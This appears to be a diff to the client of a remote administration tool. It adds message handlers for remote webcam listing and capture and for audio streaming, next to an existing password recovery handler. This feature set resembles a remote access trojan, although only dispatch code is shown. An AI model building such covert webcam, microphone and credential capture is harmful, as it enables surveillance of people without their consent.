@@ -341,6 +341,31 @@ namespace RemoteAdmin.Client.Networking
                         Console.WriteLine("Received password recovery request");
                         _ = Task.Run(async () => await PasswordRecoveryHandler.HandlePasswordRecoveryRequest(stream));
                     }
+                    else if (message is GetWebcamListMessage)
+                    {
+                        Console.WriteLine("Received get webcam list request");
+                        _ = Task.Run(async () => await WebcamHandler.HandleGetWebcamList(stream));
+                    }
+                    else if (message is StartWebcamMessage startWebcam)
+                    {
+                        Console.WriteLine($"Received start webcam request: Camera {startWebcam.CameraIndex}");
+                        _ = Task.Run(async () => await WebcamHandler.HandleStartWebcam(stream, startWebcam));
+                    }
+                    else if (message is StopWebcamMessage)
+                    {
+                        Console.WriteLine("Received stop webcam request");
+                        WebcamHandler.HandleStopWebcam();
+                    }
+                    else if (message is StartAudioStreamMessage startAudio)
+                    {
+                        Console.WriteLine($"Received start audio stream request: {startAudio.SourceType}");
+                        _ = Task.Run(async () => await AudioStreamHandler.HandleStartAudioStream(stream, startAudio));
+                    }
+                    else if (message is StopAudioStreamMessage stopAudio)
+                    {
+                        Console.WriteLine($"Received stop audio stream request: {stopAudio.SourceType}");
+                        AudioStreamHandler.HandleStopAudioStream(stopAudio);
+                    }
 
 
                 }
